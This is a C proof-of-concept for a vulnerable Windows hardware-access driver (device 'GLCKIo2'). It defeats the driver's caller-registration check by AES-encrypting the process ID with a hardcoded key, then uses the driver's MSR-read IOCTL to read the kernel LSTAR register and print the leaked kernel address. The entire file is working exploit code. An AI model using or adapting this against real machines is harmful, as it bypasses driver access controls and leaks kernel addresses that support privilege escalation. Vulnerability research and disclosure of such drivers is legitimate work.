#include "ntos.h"

#define GLCKIO_DEVICE_TYPE      (DWORD)0x8010 //same as WinIO/MsIo and all clones based on this bugfest code
#define GLCKIO_REGISTER_FUNCID  (DWORD)0x818
#define GLCKIO_READMSR          (DWORD)0x816


#define IOCTL_GKCKIO_REGISTER     \
    CTL_CODE(GLCKIO_DEVICE_TYPE, GLCKIO_REGISTER_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GKCKIO_READMSR     \
    CTL_CODE(GLCKIO_DEVICE_TYPE, GLCKIO_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)


#ifdef __cplusplus
extern "C" {
#include "aes.h" //they are using TinyAes (https://github.com/kokke/tiny-AES-c)
}
#endif

#define SWAP_UINT32(x) (((x) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | ((x) << 24))

BOOL MsioCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\GLCKIo2"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }

    AES_ctx ctx;
    UCHAR Buffer[16];
    ULONG bytesReturned = 0;
    ULONG_PTR encryptedProcessId;
    IO_STATUS_BLOCK iost;

    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };//hardcoded and a little altered value found by authors in google

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    NTSTATUS ntStatus = NtDeviceIoControlFile(deviceHandle,
        NULL,
        NULL,
        NULL,
        &iost,
        IOCTL_GKCKIO_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));

    if (!NT_SUCCESS(ntStatus))
        Beep(0, 0);

    ULONG_PTR msr = 0xC0000082; //lstar

    MsioCallDriver(deviceHandle,
        IOCTL_GKCKIO_READMSR,
        &msr,
        sizeof(msr),
        &msr,
        sizeof(msr));

    printf_s("LSTAR = 0x%llx\r\n", msr);

    CloseHandle(deviceHandle);

    return 0;
}
